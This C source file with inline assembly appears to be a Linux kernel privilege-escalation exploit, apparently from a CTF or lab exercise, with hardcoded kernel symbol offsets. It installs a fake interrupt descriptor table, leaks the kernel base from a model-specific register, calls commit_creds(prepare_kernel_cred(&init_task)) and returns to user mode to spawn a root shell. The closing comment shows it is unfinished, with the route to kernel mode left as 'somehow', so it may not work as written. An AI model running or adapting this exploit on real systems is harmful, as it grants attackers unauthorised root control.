#include "stdint.h"
#include "stdio.h"
#include "stdint.h"
#include "stdlib.h"
#include "sys/mman.h"
#include "signal.h"

#define NEW_IDT_ADDR 0x60000

struct IDTR {
  uint16_t limit;
  uint64_t addr;
} __attribute__((packed)) old_idt, new_idt;

void get_shell(void){
    puts("[+] Checking User ID");
    if (getuid() == 0){
        printf("[+] Got root!\n");
        char *args[] = {"/bin/sh", NULL};
        execvp(args[0], args);
        // system("/bin/sh");
    } else {
        printf("[!] Didn't get root\n");
        exit(-1);
    }
}

unsigned long user_cs, user_ss, user_sp, user_rflags;
unsigned long user_rip = (unsigned long)get_shell;

uint64_t commit_creds = 0x9b430;
uint64_t prepare_kernel_cred = 0x9b5d0;
uint64_t init_task = 0xe0a580;


void exploit(){
    // we will try to jump to our get_shell function using RIP
    // we will use commit_creds(prepare_kernel_cred(&init_task)) to be root while running the shell
    // this easy?????
    asm volatile("lidt (%0)" : : "r" (&old_idt) : "memory");
    __asm__(".intel_syntax noprefix;"
        "swapgs;"
        "mov ecx, 0xc0000082;"
        "rdmsr;" // he loads the MSR register in rdx(low 32 bits) and rax(high 32 bits)
        "shl rdx, 32;" // shifted the rdx
        "or rdx, rax;" // now combine rdx with rax
        "sub rdx, 0x800080;" // now sub the offset of the MSR register from the address to get the Kernel Address
        
        // now rdx contain the base kernel address
        "mov r15, rdx;"
        "mov rax, prepare_kernel_cred;"
        "add rax, rdx;"
        "mov rdi, init_task;"
        "add rdi, rdx;"
        "call rax;"
        
        "mov rdi, rax;"
        "mov rax, commit_creds;"
        "add rax, r15;"
        "call rax;"

        "swapgs;"
        "mov r15, user_ss;"
        "push r15;"
        "mov r15, user_sp;"
        "push r15;"
        "mov r15, user_rflags;"
        "push r15;"
        "mov r15, user_cs;"
        "push r15;"
        "mov r15, user_rip;"
        "push r15;"
        "iretq;"
        ".att_syntax;"
    );

}

void save_state(){
    // if we execute the privEsc function we still in the kernel_mode
    // so we have to return to user-mode
    // in kernel we will return to user-mode using one of these sysretq/iretq
    // the sysretq is complicated to get right so we will uses iretq
    // The iretq instruction just requires the stack to be setup with 5 userland
    // registers values in order: RIP | CS | RFLAGS | SP | SS
    // RIP : we can simply set this to be the address of the function that pops a shell
    __asm__(
        ".intel_syntax noprefix;"
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;"
        ".att_syntax;"
    );
}

void main(){
    asm volatile("sidt %0" : "=m" (old_idt));

    printf("old_idt = {limit = 0x%x, addr = 0x%x}\n", old_idt.limit, old_idt.addr);
    
    // create a fake IDT table
    uint64_t* fake_idt = mmap(NEW_IDT_ADDR, 0x1000, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_SHARED, -1, 0);
    if( fake_idt < 0 ){
        exit(-1);
    }

    printf("fake_idt @ %p\n", fake_idt);

    printf("fake_idt @ 0x%lx\n", fake_idt);

    uint16_t low = (uint64_t)(&exploit) & 0xffff;
    uint64_t mid = ((uint64_t)(&exploit) >> 16) & 0xffff;
    uint32_t high = ((uint64_t)(&exploit) >> 32)& 0xffffffff;

    printf("exploit @ %p\n", exploit);
    printf("interrupt handler @ 0x%x%hx%hx\n", high, mid, low);

    for(int i=0; i < 0x1000/8; i+=2){
        fake_idt[i] = 0x00008e0000100000 | low | (mid << 48);
        fake_idt[i+1] = 0 | high;
    }

    printf("fake_idt[0] = %p\n", fake_idt[0]);
    printf("fake_idt[1] = %p\n", fake_idt[1]);

    // 0x00008e0000100000 
    // 0x18148e0000100000

    new_idt.limit = 0xffff;
    new_idt.addr = NEW_IDT_ADDR;

    printf("\tnew_idt = {limit = 0x%x, addr = 0x%x}\n", new_idt.limit, new_idt.addr);

    asm volatile("lidt (%0)" : : "r" (&new_idt) : "memory");
    save_state();
    asm volatile("int $0x80");
}

/*

1. store the IDT (sidt)
2. create new IDT and push it using (lidt)
3. corrupt all of the intrrupt table (4k?)
3. save the state
4. exploit the CPL0 (somehow)
5. 

*/